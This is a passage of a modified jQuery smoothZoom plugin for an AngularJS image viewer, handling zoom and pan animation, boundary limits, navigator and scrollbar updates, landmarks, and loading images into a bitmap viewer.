					self._sc += (self.rA - self._sc) / self.reduction;
				} else {
					self._sc = self.rA;
				}

			//Case 2: Normal Zoom
			} else {
				// self._sc += (self.rA - self._sc) / (self.ani_smooth/(self._onfocus? self.reduction : 1));
				self._sc = self.rA;
			}

			self._w = self._sc * self.iW;
			self._h = self._sc * self.iH;

			//Dragging
			if (self._dragging) {
				self.tX = self.dX;
				self.tY = self.dY;
				self.changeOffset(true, true);
			}

			//Check if Zoom In completed
			if (self._recent == "zoomIn") {
				if (self._w > (self.rA * self.iW) - pixTol && !self.zoom_single) {
					if (self.cFlag._nd) {
						self.ani_end = true;
					}
					self._sc = self.rA;
				} else if (self._w > (self.zoom_max * self.iW) - pixTol && self.zoom_single) {
					if (self.cFlag._nd) {
						self.ani_end = true;
					}
					self._sc = self.rA = self.zoom_max;
				}
				if (self.ani_end){
					self._w = self._sc * self.iW;
					self._h = self._sc * self.iH;
				}

			//Check if Zoom Out completed
			} else if (self._recent == "zoomOut") {
				if (self._w < (self.rA * self.iW) + pixTol  && !self.zoom_single) {
					if (self.cFlag._nd) {
						self.ani_end = true;
					}
					self._sc = self.rA;
				} else if (self._w < (self.rF * self.iW) + pixTol  && self.zoom_single) {
					if (self.cFlag._nd) {
						self.ani_end = true;
					}
					self._sc = self.rA = self.rF;
				}
				if (self.ani_end){
					self._w = self._sc * self.iW;
					self._h = self._sc * self.iH;
				}
			}

			//Move image according to boundary limits
			// self.limitX = (((self._w - self.sW) / (self._w / self.sW)) / 2);
			// self.limitY = (((self._h - self.sH) / (self._h / self.sH)) / 2);

			// if (!self._dragging) {
				// if (self.pan_limit) {
				// 	if (self.oX < -self.limitX - self.focusOffX) {
				// 		self.oX = -self.limitX - self.focusOffX;
				// 	}
				// 	if (self.oX > self.limitX - self.focusOffX) {
				// 		self.oX = self.limitX - self.focusOffX;
				// 	}
				// 	if (self._w < self.sW) {
				// 		self.tX = (self.sW - self._w) / 2;
				// 		self.changeOffset(true, false);
				// 	}
				// 	if (self.oY < -self.limitY - self.focusOffY) {
				// 		self.oY = -self.limitY - self.focusOffY;
				// 	}
				// 	if (self.oY > self.limitY - self.focusOffY) {
				// 		self.oY = self.limitY - self.focusOffY;
				// 	}
				// 	if (self._h < self.sH) {
				// 		self.tY = (self.sH - self._h) / 2;
				// 		self.changeOffset(false, true);
				// 	}
				// }
				// else {
					// if (self.oX < -self.limitX - (self.focusOffX / self._w * self.sW) - ((self.sW / 2) / (self._w / self.sW))) {
					// 	self.oX = -self.limitX - (self.focusOffX / self._w * self.sW) - ((self.sW / 2) / (self._w / self.sW));
					// }

					// if (self.oX > self.limitX - (self.focusOffX / self._w * self.sW) + ((self.sW / 2) / (self._w / self.sW))) {
					// 	self.oX = self.limitX - (self.focusOffX / self._w * self.sW) + ((self.sW / 2) / (self._w / self.sW));
					// }

					// if (self.oY < -self.limitY - (self.focusOffY / self._h * self.sH) - (self.sH / (self._h / self.sH * 2))) {
					// 	self.oY = -self.limitY - (self.focusOffY / self._h * self.sH) - (self.sH / (self._h / self.sH * 2));
					// }

					// if (self.oY > self.limitY - (self.focusOffY / self._h * self.sH) + (self.sH / (self._h / self.sH * 2))) {
					// 	self.oY = self.limitY - (self.focusOffY / self._h * self.sH) + (self.sH / (self._h / self.sH * 2));
					// }
				// }
			// }
			if (!self._dragging && self._recent != "drag") {
				self.tX = ((self.sW - self._w) / 2) + self.focusOffX + (self.oX * (self._w / self.sW));
				self.tY = ((self.sH - self._h) / 2) + self.focusOffY + (self.oY * (self._h / self.sH));
				if (self.ani_smooth === 1) {
					self.cFlag._nd = true;
					self.ani_end = true;
				}
			}
			if (self._recent == "zoomIn" || self._recent == "zoomOut" || self.cFlag._rs) {
				self._x = self.tX;
				self._y = self.tY;
			} else {
				self._x += (self.tX - self._x) / (self.ani_smooth/(self._onfocus? self.reduction : 1));
				self._y += (self.tY - self._y) / (self.ani_smooth/(self._onfocus? self.reduction : 1));
			}

			//Check if Left movement completed
			if (self._recent == "left") {
				if (self._x < self.tX + pixTol || self.ani_smooth === 1) {
					self.cFlag._nd ? self.ani_end = true : "";
					self._recent = '';
					self._x = self.tX;
				}

			//Check if Right  movement completed
			} else if (self._recent == "right") {
				if (self._x > self.tX - pixTol || self.ani_smooth === 1) {
					self.cFlag._nd ? self.ani_end = true : "";
					self._recent = '';
					self._x = self.tX;
				}

				//Check if Up movement completed
			} else if (self._recent == "up") {
				if (self._y < self.tY + pixTol || self.ani_smooth === 1) {
					self.cFlag._nd ? self.ani_end = true : "";
					self._recent = '';
					self._y = self.tY;
				}

				//Check if Down movement completed
			} else if (self._recent == "down") {
				if (self._y > self.tY - pixTol || self.ani_smooth === 1) {
					self.cFlag._nd ? self.ani_end = true : "";
					self._recent = '';
					self._y = self.tY;
				}

			//Check if Dragging completed
			} else if (self._recent == "drag") {
				if (self._x + pixTol >= self.tX && self._x - pixTol <= self.tX && self._y + pixTol >= self.tY && self._y - pixTol <= self.tY || self.ani_smooth === 1) {
					if (self._onfocus) {
						self._dragging = false;
					}
					self.cFlag._nd ? self.ani_end = true : "";
					self._recent = '';
					self._x = self.tX;
					self._y = self.tY;
				}
			}

			//Check if Reset completed
			if (self.cFlag._rs && self._w + pixTol >= (self.rA * self.iW) && self._w - pixTol <= (self.rA * self.iW) && self.oX <= self.fX+pixTol && self.oX >= self.fX-pixTol && self.oY <= self.fY+pixTol && self.oY >= self.fY-pixTol) {
				self.ani_end = true;
				self._recent = '';
				self.cFlag._rs = false;
				self.cFlag._nd = true;
				self._x = self.tX;
				self._y = self.tY;
				self._sc = self.rA;
				self._w = self._sc * self.iW;
				self._h = self._sc * self.iH;
			}

			if (!$scope) {
				$scope = angular.element("body").scope();
			}

			//Apply Scale and position to the image:
			if (prop_transform) {
				if (!$scope.current) return;
				// 邊界鎖定，各留下 10px
				var transformX = parseInt(self._x.toFixed(14));
				var transformY = parseInt(self._y.toFixed(14));
				var dummyX = 10000 * self._sc - ($scope.current.width * self._sc) / 2;
				var offsetTransformX = transformX + dummyX;
				var outOfBoundarX = false;
				var outOfBoundary = false;

				if ($scope.current) {
					if (transformY > self.sH - 60) {
						transformY = self.sH - 60;
						outOfBoundary = true;
					}
					else if (transformY < -($scope.current.height * self._sc) + 50) {
						transformY = -($scope.current.height * self._sc) + 50;
						outOfBoundary = true;
					}
					if (offsetTransformX > self.sW - 10) {
						transformX = self.sW - (dummyX) - 10;
						outOfBoundary = true;
					}
					else if (offsetTransformX < -($scope.current.width * self._sc) + 10) {
						transformX = -($scope.current.width * self._sc) - (dummyX) + 10;
						outOfBoundary = true;
					}
				}

				if (outOfBoundary) {
					if (self._lastY && self._lastY === transformY) {
						self.ani_end = true;
					}
					else {
						self._y = transformY;
						self._lastY = self._y;
					}
					self.dY = transformY;
					self.tY = self.dY;

					if (self._lastX && self._lastX === transformX) {
						self.ani_end = true;
					}
					else {
						self._x = transformX;
						self._lastX = self._x;
					}
					self.dX = transformX;
					self.tX = self.dX;

					self.changeOffset(true, true);
				}

				let navigatorZoomData = self.getZoomData();
				let navigatorTop = (navigatorZoomData.normY) / $bodyScope.current.height * 100;
				let navigatorStartX = (20000 / 2) - ($bodyScope.current.width / 2);
				let navigatorLeft = (navigatorZoomData.normX - navigatorStartX) / $bodyScope.current.width * 100;
				let navigatorWidth = self.sW / ($bodyScope.current.width * navigatorZoomData.ratio) * 100;
				let navigatorHeight = self.sH / ($bodyScope.current.height * navigatorZoomData.ratio) * 100;
				
				if (self.scrollbar.navigator) {
					if (self._sc * $scope.current.width * 0.97 > self.sW || self._sc * $scope.current.height > self.sH) {
						self.scrollbar.navigatorViewport.css({
							top: `${navigatorTop}%`,
							left: `${navigatorLeft}%`,
							height: `${ navigatorHeight }%`,
							width: `${ navigatorWidth }%`
						});

						self.scrollbar.navigator.css({ display: 'flex' });
					}
					else {
						self.scrollbar.navigator.css({ display: 'none' });
					}
				}

				self.bitmapViewer.update({
					id: $bodyScope.current.id,
					top: parseInt(navigatorZoomData.normY),
					left: parseInt(navigatorZoomData.normX - navigatorStartX),
					width: parseInt(navigatorWidth / 100 * $bodyScope.current.width),
					height: parseInt(navigatorHeight / 100 * $bodyScope.current.height)
				});

				// 横向 scrollbar
				if (self.scrollbar.horizontal) {
					if (self._sc * $scope.current.width > self.sW) {
						var width;
						var right;
						if ($scope.current.width > self.sW) {
							width = self.sW / $scope.current.width / self._sc * 100 / 2;
							right = ( (offsetTransformX + (self.sW * (self.sW / $scope.current.width) / self._sc / 2)) + $scope.current.width * self._sc) / (self.sW + $scope.current.width * self._sc) * 100;
						}
						else {
							width = 1 / self._sc * 100 / 2;
							right = ( (offsetTransformX + (self.sW / self._sc / 2)) + $scope.current.width * self._sc) / (self.sW + $scope.current.width * self._sc) * 100;
						}
						if (right > 100) right = 100;
						if (right < width) right = width;
						
						self.scrollbar.horizontal.css({
							left: `${100 - right}%`,
							width: `${ width }%`
						});	
						self.scrollbar.horizontal.parent().css({ display: 'block' });
					}
					else {
						self.scrollbar.horizontal.parent().css({ display: 'none' });
					}
				}

				// 縱向 scrollbar
				if (self.scrollbar.vertical) {
					if (self._sc * $scope.current.height > self.sH) {
						var height;
						var bottom;
						// var sH = self.sH - 80;
						if ($scope.current.height > self.sH) {
							height = self.sH / $scope.current.height / self._sc * 100 / 2;
							bottom = ( (transformY + self.sH / 3 + (self.sH * (self.sH / $scope.current.height) / self._sc / 2)) + $scope.current.height * self._sc) / (self.sH + $scope.current.height * self._sc) * 100;
						}
						else {
							height = 1 / self._sc * 100 / 2;
							bottom = ( (transformY + self.sH / 3 + (self.sH / self._sc / 2)) + $scope.current.height * self._sc) / (self.sH + $scope.current.height * self._sc) * 100;
						}
						if (bottom > 100) bottom = 100;
						if (bottom < height) bottom = height;
						// console.log(100 - bottom);
						self.scrollbar.vertical.css({
							top: `${100 - bottom}%`,
							height: `${ height }%`
						});	
						self.scrollbar.vertical.parent().css({ display: 'block' });
					}
					else {
						self.scrollbar.vertical.parent().css({ display: 'none' });
					}
				}
				
				// 绘制图像
				// self.$image.css(prop_transform, `translate3d(${transformX}px, ${transformY}px, 0px) scale3d(${self._sc}, ${self._sc}, ${self._sc})`);
				self.$image.css(prop_transform, `translate(${transformX}px, ${transformY}px) scale(${self._sc}, ${self._sc})`);
				// self.$image.css(prop_transform, 'translate3d(' + parseInt(self._x.toFixed(14)) + 'px,' + transformY + 'px, 0px) scale3d(' + self._sc + ', ' + self._sc + ',' + self._sc +')');
				// console.log(`transformY: ${transformY}`)
				// console.log(`self.tY: ${self.tY}`)
				// console.log(`_lastY: ${self._lastY}`)
				

				// console.log(`transformX: ${offsetTransformX}`)
				// console.log(`sW: ${self.sH}`)
				// console.log(`self.tX: ${self._x + 50000 * self._sc}`)
				// console.log(`_lastX: ${self._lastX}`)
			} else {
				self.$image.css({
					left: self._x,
					top: self._y,
					width: self._w,
					height: self._h
				});
			}

			//If the animation completed, stop running; else continue
			if (self.ani_end && !self._dragging && self._recent != "drag") {
				self._playing = false;
				self._recent = '';
				self.cX = (-self._x + (self.sW / 2)) / self.rA;
				self.cY = (-self._y + (self.sH / 2)) / self.rA;
				if (self.onUPDATE) {
					self.onUPDATE (self.getZoomData(), false);
				}
				if (self.onZOOM_PAN) {
					self.onZOOM_PAN (self.getZoomData());
				}
				clearTimeout(self.ani_timer);
			} else {
				self._playing = true;
				if (self.onUPDATE) {
					self.onUPDATE (self.getZoomData(), true);
				}
				clearTimeout(self.ani_timer);
				self.ani_timer = setTimeout(function () {
					self.Animate();
				}, 8);
			}
		},


		/*Relocate the landmarks according to main image's position
		***********************************************************************************************************************/
		updateLocations: function (_x, _y, _sc, loc) {

			if (this.onLANDMARK !== ''){
				if (_sc >= this.show_at_zoom) {
					if (!this._landmark) {
						this._landmark = true
						this.onLANDMARK (true);
					}
				} else {
					if (this._landmark) {
						this._landmark = false;
						this.onLANDMARK (false);
					}
				}
			}

			for (var p = 0; p < loc.length; p++) {
				var wScaled,
					hScaled,
					lpx = (loc[p].x * _sc) + _x,
					lpy = (loc[p].y * _sc) + _y;

				if (_sc >= loc[p].showAt) {
					if (loc[p].scale && prop_transform){
						wScaled = loc[p].w2pad*this._sc;
						hScaled = loc[p].h2*this._sc;
					} else {
						wScaled = loc[p].w2pad;
						hScaled = loc[p].h2;
					}
					if (lpx > -wScaled && lpx < this.sW + wScaled && ((lpy > -hScaled && lpy < this.sH + hScaled && loc[p].lab) || (lpy > 0 && lpy < this.sH + (hScaled*2) && !loc[p].lab))) {
						if (!loc[p].vis) {
							loc[p].vis = true;
							if(prop_transform) {
								loc[p].ob.stop()
									.css('display', 'block')
									.animate({
										opacity: 1
									}, 0);
							} else {
								loc[p].ob.show();
							}
						}
					} else {
						if (loc[p].vis) {
							loc[p].vis = false;
							if(prop_transform) {
								loc[p].ob.stop()
									.animate({
										opacity: 0
									}, 0, function() {
										$(this).hide();
									});
							} else {
								loc[p].ob.hide();
							}
						}
					}
				} else {
					if (loc[p].vis) {
						loc[p].vis = false;
						if(prop_transform) {
							loc[p].ob.stop()
								.animate({
									opacity: 0
								}, 0, function() {
									$(this).hide();
								});
						} else {
							loc[p].ob.hide();
						}
					}
				}
				if (lpx !== loc[p].lpx || lpy !== loc[p].lpy && loc[p].vis) {
					if (prop_transform) {
						// loc[p].ob.css(prop_transform, 'translate(' + parseInt(lpx.toFixed(14)) + 'px,' + parseInt(lpy.toFixed(14)) + 'px)' + (loc[p].scale? ' scale(' + this._sc + ')' : ''));
						loc[p].ob.css(prop_transform, 'translate(' + parseInt(lpx.toFixed(14)) + 'px,' + parseInt(lpy.toFixed(14)) + 'px)' + (loc[p].scale? ' scale3d(' + self._sc + ', ' + self._sc + ',' + self._sc +')' : ''));
					} else {
						loc[p].ob.css({
							left: lpx,
							top: lpy
						});
					}
				}
				loc[p].lpx = lpx;
				loc[p].lpy = lpy;
			}
		},


		/*If the broswer doesn't supports css border radius, we need to go with old school png image for rounded corner
		***********************************************************************************************************************/
		roundBG: function (el, _name, _w, _h, _r, _p, _c, _i, _z, _yoff) {
			var w = 50 / 2;

			el.append($(
				'<div class="bgi' + _name + '" style="background-position:' + (-(_p - _r)) + 'px ' + (-(w - _r) - _yoff) + 'px"></div>\
				<div class="bgh' + _name + '"></div>\
				<div class="bgi' + _name + '" style="background-position:' + (-_p) + 'px ' + (-(w - _r) - _yoff) + 'px; left:' + (_w - _r) + 'px"></div>\
				<div class="bgi' + _name + '" style="background-position:' + (-(_p - _r)) + 'px ' + (-w - _yoff) + 'px; top:' + (_h - _r) + 'px"></div>\
				<div class="bgh' + _name + '" style = "top:' + (_h - _r) + 'px; left:' + _r + 'px"></div>\
				<div class="bgi' + _name + '" style="background-position:' + (-_p) + 'px ' + (-w - _yoff) + 'px; top:' + (_h - _r) + 'px; left:' + (_w - _r) + 'px"></div>\
				<div class="bgc' + _name + '"></div>'
			));
			$('.bgi' + _name).css({
				position: 'absolute',
				width: _r,
				height: _r,
				'background-image': 'url(' + _i + ')',
				'background-repeat': 'no-repeat',
				'-ms-filter': 'progid:DXImageTransform.Microsoft.gradient(startColorstr=#00FFFFFF,endColorstr=#00FFFFFF)',
				'filter': 'progid:DXImageTransform.Microsoft.gradient(startColorstr=#00FFFFFF,endColorstr=#00FFFFFF)',
				'zoom': 1
			});
			$('.bgh' + _name).css({
				position: 'absolute',
				width: _w - _r * 2,
				height: _r,
				'background-color': _c,
				left: _r
			});
			$('.bgc' + _name).css({
				position: 'absolute',
				width: _w,
				height: _h - _r * 2,
				'background-color': _c,
				top: _r,
				left: 0
			});
		},


		/*To calibrate position offset when navigation events supposed to be overlapped
		***********************************************************************************************************************/
		changeOffset: function (x, y) {
			if (x) this.oX = (this.tX - ((this.sW - this._w) / 2) - this.focusOffX) / (this._w / this.sW);
			if (y) this.oY = (this.tY - ((this.sH - this._h) / 2) - this.focusOffY) / (this._h / this.sH);
		},


		/*Transform Image Maps (hot spots) if any
		***********************************************************************************************************************/
		updateMap: function () {
			var self = this,
				mapId = 0;

			self.mapAreas.each(function () {
				var new_vals = [];
				for (var i = 0; i < self.map_coordinates[mapId].length; i++) {
					new_vals[i] = self.map_coordinates[mapId][i] * self._sc;
				}
				new_vals = new_vals.join(",");
				$(this).attr('coords', new_vals);
				mapId++;
			});
		},


		/*To stop the timer loops immediatly
		***********************************************************************************************************************/
		haltAnimation: function () {
			clearTimeout(this.ani_timer);
			this._playing = false;
			this._recent = '';
		},


		/*Method to Remove the plugin instance
		***********************************************************************************************************************/
		destroy: function () {
			var self = this;

			if (self.assetsLoaded) {
				self.haltAnimation();
				// for (prop in self.orig_style) {
				// 	if (self.orig_style[prop][0] !== false && self.orig_style[prop][0] !== undefined) {
				// 		if (self.orig_style[prop][0] === 'width' || self.orig_style[prop][0] === 'height') {
				// 			if (parseInt(self.orig_style[prop][1]) !== 0) {
				// 				self.$image.css(self.orig_style[prop][0], self.orig_style[prop][1]);
				// 			}
				// 		} else {
				// 			self.$image.css(self.orig_style[prop][0], self.orig_style[prop][1]);
				// 		}
				// 	}
				// }
				clearTimeout(self.auto_timer);
				$(document).unbind('.sz' + self.id);
				$(window).unbind('.sz' + self.id);
				self.$holder.unbind('.sz');
				self.$controls = undefined;
			} else {
				self.$image.show();
			}

			// if (self.container =='') {
			// 	if (self.image_url == '') {
			// 		self.$image.insertBefore(self.$holder);
			// 		if (self.$holder !== undefined) {
			// 			self.$holder.remove();
			// 		}
			// 	} else {
			// 		self.$elem.empty();
			// 		if (self.$loc_cont[0]) {
			// 			self.$elem.append(self.loc_clone);
			// 		}
			// 	}
			// } else {
			// 	self.$image.insertBefore(self.$holder);
			// 	self.$holder.empty();
			// 	self.$image.wrap(self.$holder);
			// 	if (self.$loc_cont[0]) {
			// 		self.$holder.append(self.loc_clone);
			// 	}
			// }
			// self.$elem.removeData('smoothZoom');
			// self.$holder = undefined;
			// self.Buttons = undefined;
			// self.op = undefined;
			// self.$image = undefined;
		},

		moveY: function (offset) {
			var self = this;
			self.tY -= offset;
			self._y = self.tY;
			self.changeOffset(true, true);
			self.Animate();
		},

		moveX: function (offset) {
			var self = this;
			self.tX -= offset;
			self._x = self.tX;
			self.changeOffset(true, true);
			self.Animate();
		},

		goToY: function (y) {
			var self = this;
			self.tY = y;
			self._y = self.tY;
			self.changeOffset(true, true);
			self.Animate();
		},

		goTo: function (x, y, ratio) {
			var self = this;
			self.rA = ratio;
			self.Animate();
			self.tX = x;
			self.tY = y;
			self.changeOffset(true, true);
			self.Animate();
		},

		cleanBitmapViewer: function () {
			this.bitmapViewer.clear();
		},

		rotate: async function ({ angle, item }) {
			await this.bitmapViewer.hideThumbnail();
			await this.bitmapViewer.rotate(angle);
			this.focusTo({
				x: $("#detail-container").width() / 2,
				y: item.height / 2 + 24,
				speed: 0
			});
		},

		flip: async function (scaleX) {
			await this.bitmapViewer.hideThumbnail();
			await this.bitmapViewer.flip(scaleX);
			this.Animate();
		},

		preload: async function (item) {
			if (!item) return;
			this.bitmapViewer.preload(item);
		},

		clearPreloadData: function () {
			this.bitmapViewer.clearPreloadData();
		},

		updateNavigator: async function (image) {
			if (!image) return;
			let self = this;
            let thumbnailUrl = FileUrlHelper.getThumbnailUrl(image) + `?t=${Date.now()}`;
            let $background = self.scrollbar.navigator.find(".background");

            if (image.orientation && image.orientation !== 1) {
            	thumbnailUrl = FileUrlHelper.getRawUrl(image) + `?t=${Date.now()}`;
            }

            $background.css("background-image", `url('${thumbnailUrl}')`);
            // 計算 background 邊界大小
            let maxEdge = NAVIGATOR_SIZE;
            let backgroundHeight;
            let backgroundWidth;
            let ratio;
            if (image.width > image.height) {
            	ratio = image.width / image.height;
            	backgroundWidth = NAVIGATOR_SIZE;
            	backgroundHeight = parseInt(NAVIGATOR_SIZE / ratio);
            }
            else {
            	ratio = image.height / image.width;
            	backgroundHeight = NAVIGATOR_SIZE;
            	backgroundWidth = parseInt(NAVIGATOR_SIZE / ratio);
            }
            $background.css({
            	width: backgroundWidth + "px",
            	height: backgroundHeight + "px"
            });

			const $injector = angular.element("html").injector();
			const $rootScope = $injector.get('$rootScope');
			const rawURL = $bodyScope.getRawUrl(image);
			const thumbnailURL = $bodyScope.getThumbnailUrl(image);
			
			if (self.bitmapViewer.isSupportFormat(image.ext)) {	
				$("#detail-image").css("opacity", 1);
				const loadRawTimeoutDuration = Math.max(5, Math.min((image.width * image.height) / 50000, 30));
				try {
					clearTimeout(self.loadBitmapViewerTimeout);
					self.loadBitmapViewerTimeout = setTimeout(async () => {
						try {
							const result = await self.bitmapViewer.loadURL(rawURL, image);
							if (result?.usingImgTag) {
								$rootScope.supportCrop = false;
								$rootScope.supportRotate = false;
								self.bitmapViewer.clear();
								$("#detail-image").attr("src", rawURL);
								$("#detail-image").css("opacity", 1);
							}
							else {
								$rootScope.supportCrop = true;
								$rootScope.supportRotate = true;
								$("#detail-image").attr("src", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAQSURBVHgBAQUA+v8AAAAAAAAFAAFkeJU4AAAAAElFTkSuQmCC");
							}
							$rootScope.$evalAsync();
							self.Animate(true);
						} catch (e) {
							self.bitmapViewer.clear();
						}
					}, loadRawTimeoutDuration);
				} catch (e) {
					self.bitmapViewer.clear();
				}
			}
			else {
				$rootScope.supportCrop = false;
				$rootScope.supportRotate = false;
				$rootScope.$evalAsync();
				self.bitmapViewer.clear();
			}
		},

		reset: function () {
			var self = this,
				$image = self.$image,
				sW = self.sW,
				sH = self.sH;
				// container = self.container,
				// cBW, cBH, pan_show = self.pan_show,
				// zoom_show = self.zoom_show,
				// $controls = self.$controls,
				// buttons = self.buttons,
				// cFlag = self.cFlag,
				// bu_align = self.bu_align,
				// bu_margin = self.bu_margin,
				// $holder = self.$holder;

			//In case parent element's display property set to 'none', we need to first set them 'block', measure the width and height and then set them back to 'none'
			var temp = $image,
			dispArray = [];
			for (var i = 0; i<5; i++) {
				if (temp && temp[0] && temp[0].tagName !== 'BODY' && temp[0].tagName !== 'HTML'){
					if (temp.css('display') == 'none') {
						temp.css('display', 'block');
						dispArray.push(temp);
					}
					temp = temp.parent();
				} else {
					break;
				}
			}

			self.iW = $image.width();
			self.iH = $image.height();


			//Initially the image needs to be resized to fit container. To do so, first measure the scaledown ratio
			self.rF = self.rR = self.checkRatio(sW, sH, self.iW, self.iH, self.zoom_fit);

			//If NO Minimum zoom value set
			if (self.zoom_min == 0 || self.init_zoom != 0) {
				if (self.init_zoom != '') {
					self.rA = self._sc = self.init_zoom;
				} else {
					self.rA = self._sc = self.rF;
				}
				if (self.zoom_min != 0) {
					self.rF = self.zoom_min;
					if (self.reset_to_zmin) {
						self.rR = self.zoom_min
					}
				}

			//If Minimum zoom value set
			} else {
				// if (self.rF < self.zoom_min) {
					self.rF = self.zoom_min;
					if (self.reset_to_zmin) {
						self.rR = self.zoom_min
					}
					self.rA = self._sc = self.zoom_min;
				// } else {
				// 	self.rA = self._sc = self.rR;
				// }
			}

			//Width and Height to be applied to the image
			// self._w = self._sc * self.iW;
			// self._h = self._sc * self.iH;

		},


		/*Method to change focus point and level
		***********************************************************************************************************************/
		focusTo: function (params) {
			var self = this;
			params.pageX = params.pageX || 0;
			params.pageY = params.pageY || 0;
			if (params.zoom === undefined || params.zoom === '' || params.zoom == 0) {
				params.zoom = self.rA;
			} else {
				params.zoom /= 100;
			}
			self._onfocus = true;
			if (params.zoom > self.rA && self.rA != self.zoom_max) {
				self.rA = params.zoom;
				self.rA = self.rA > self.zoom_max ? self.zoom_max : self.rA;
			} else if (params.zoom < self.rA && self.rA != self.rF) {
				self.rA = params.zoom;
				self.rA = self.rA < self.rF ? self.rF : self.rA;
			}
			self.transOffX = self.transOffY = 0;

			if (params.x && params.y) {
				self.setDraggedPos(params.x === undefined || params.x === '' ? "" : (-params.x * self.rA) + (self.sW / 2), params.y === undefined || params.y === '' ? "" : (-params.y * self.rA) + (self.sH / 2), self.rA);
				self.reduction =  1;
				self._recent = 'drag';
				self._dragging = true;
				// if(!self._playing) {
					self.Animate(true);
				// }
			}
			else {
				self.focusOffX = params.pageX - self.$holder.offset().left - (self.sW / 2);
				// self.focusOffY = params.pageY - self.$holder.offset().top - (self.sH / 2);
				// 置中修复
				self.focusOffY = params.pageY - self.$holder.offset().top / 2 - (self.sH / 2);
				self.changeOffset(true, true);
				self._wheel = true;
				self._dragging = false;
				self.Animate();
			}
		},

		zoomIn: function (params) {
			// this.buttons[0].$ob.trigger(this.event_down, {
			// 	id: 0
			// });
		},

		zoomOut: function (params) {
			// this.buttons[1].$ob.trigger(this.event_down, {
			// 	id: 1
			// });
		},

		moveRight: function (params) {
			// this.buttons[2].$ob.trigger(this.event_down, {
			// 	id: 2
			// });
		},

		moveLeft: function (params) {
			// this.buttons[3].$ob.trigger(this.event_down, {
			// 	id: 3
			// });
		},

		moveUp: function (params) {
			// this.buttons[4].$ob.trigger(this.event_down, {
			// 	id: 4
			// });
		},

		moveDown: function (params) {
			// this.buttons[5].$ob.trigger(this.event_down, {
			// 	id: 5
			// });
		},

		Reset: function (params) {
			// this.buttons[6].$ob.trigger(this.event_down, {
			// 	id: 6
			// });
		},

		getChangedData: function (params) {
			return {
				tX: this.tX,
				tY: this.tY,
				rA: this.rA
			};
		},

		getZoomData: function (params) {
			return {
				//x offset (without scale ratio multiplied)
				normX: (-this._x / this.rA).toFixed(14),

				//y offset (without scale ratio multiplied)
				normY: (-this._y / this.rA).toFixed(14),

				//Original image Width
				normWidth: this.iW,

				//Original image height
				normHeight: this.iH,

				//x offset (with scale ratio multiplied)
				scaledX: -this._x.toFixed(14),

				//y offset (with scale ratio multiplied)
				scaledY: -this._y.toFixed(14),

				//Scaled image width
				scaledWidth: this._w,

				//Scaled image height
				scaledHeight: this._h,

				//The X location on image which is currently on center of canvas
				centerX: (-this._x.toFixed(14) + (this.sW / 2)) / this.rA,

				//The Y location on image which is currently on center of canvas
				centerY: (-this._y.toFixed(14) + (this.sH / 2)) / this.rA,

				//Scale ratio
				ratio: this.rA
			};
		},

		addLandmark: function (loc) {
			if (this.$loc_cont) {
				var total = loc.length;

				for (var i=0; i<total; i++) {
					var $loc = $(loc[i]);
					this.$loc_cont.append($loc);
					this.setLocation($loc);
				}

				if (total>0) {
					this.updateLocations(this._x, this._y, this._sc, this.locations);
				}
			}
		},

		attachLandmark: function (loc) {
			if (this.$loc_cont){
				var total = loc.length;
				for (var i=0; i<total; i++) {
					this.setLocation( loc[i] instanceof jQuery ? loc[i] : $('#'+loc[i]));
				}
				if (total>0) {
					this.updateLocations(this._x, this._y, this._sc, this.locations);
				}
			}
		},

		removeLandmark: function (loc) {
			if (this.$loc_cont){
				if (loc){
					var total = loc.length;
					for (var i=0; i<total; i++) {
						for (var j=0; j<this.locations.length; j++) {
							if ((loc[i] instanceof jQuery && this.locations[j].ob[0] == loc[i][0]) || (!(loc[i] instanceof jQuery) && this.locations[j].ob.attr('id') == loc[i])) {
								this.locations[j].ob.remove ();
								this.locations.splice(j,1);
								j--;
							}
						}
					}
				} else {
					if (this.locations.length > 0) {
						this.locations[this.locations.length-1].ob.remove ();
						this.locations.pop();
					}
				}
				if (total>0) {
					this.updateLocations(this._x, this._y, this._sc, this.locations);
				}
			}
		},

		refreshAllLandmarks: function () {
			var self = this;
			var locs = self.$loc_cont.children('.item');
			self.show_at_zoom = parseInt(self.$loc_cont.data('show-at-zoom'),10) / 100;
			self.allow_scale = checkBoolean(self.$loc_cont.data('allow-scale'));
			self.allow_drag = checkBoolean(self.$loc_cont.data('allow-drag'));

			//Step 1: Remove records for which the elements no longer exist
			for (var i=0; i<self.locations.length; i++) {
				var exists = false;
				locs.each(function () {
					if (self.locations[i].ob[0] == $(this)[0]) {
						exists = true;
					}
				});
				if (!exists) {
					self.locations.splice(i,1);
					i--;
				}
			}

			//Step 2: Add new elements to record
			locs.each(function () {
				var exists = false;
				for (var i=0; i<self.locations.length; i++) {
					if (self.locations[i].ob[0] == $(this)[0]) {
						exists = true;
						break;
					}
				}
				if (!exists) {
					self.setLocation($(this));
				}

			});
			this.updateLocations(this._x, this._y, this._sc, this.locations);
		},


		/*On windows resize, adjust some defaults
		***********************************************************************************************************************/
		resize: function (e) {

			if (!$scope) {
				$scope = angular.element("body").scope();
			}
			if (!$scope.isDetailMode) {
				return;
			}

			var self;
			e.preventDefault();
			self = e.data.self;
			var pw = self.$holder.parent().width();
			var ph = self.$holder.parent().height();
			self.sW = pw;
			self.sH = ph;

			if (!this._x) {
				self.Animate();
				return;
			}
		}
	}


	$.fn.smoothZoom = function (params) {
		var self = this;
		var l = self.length;

		//For single or more than one plugin instance
		for (var i = 0; i<l; i++) {
			var $elem = $(self[i]);
			var instance = $elem.data('smoothZoom');

			// Case 1: Initiate the plugin if not already have an instance
			if (!instance) {

				if (typeof params === 'object' || !params) {
					$elem.data('smoothZoom', new Zoomer($elem, params));
				}

			// Case 2: If the instance already available - Check for method call
			} else {

				// getZoomData - Returns {sourceX, sourceY, sourceWidth, sourceHeight, distX, distY, distWidth, distHeight, centerX, centerY, ratio}
				if (params == "getZoomData") {
					return instance[params].apply(instance, Array.prototype.slice.call(arguments, 1));

				// destroy | focusTo | zoomIn | zoomOut | moveRight| moveLeft | moveUp | moveDown | Reset | addLandmark | removeLandmark | attachLandmark | refreshAllLandmarks
				}
				else if (params == "getChangedData") {
					return instance[params].apply(instance, Array.prototype.slice.call(arguments, 1));

					// destroy | focusTo | zoomIn | zoomOut | moveRight| moveLeft | moveUp | moveDown | Reset | addLandmark | removeLandmark | attachLandmark | refreshAllLandmarks
				} 
				else if (instance[params]) {
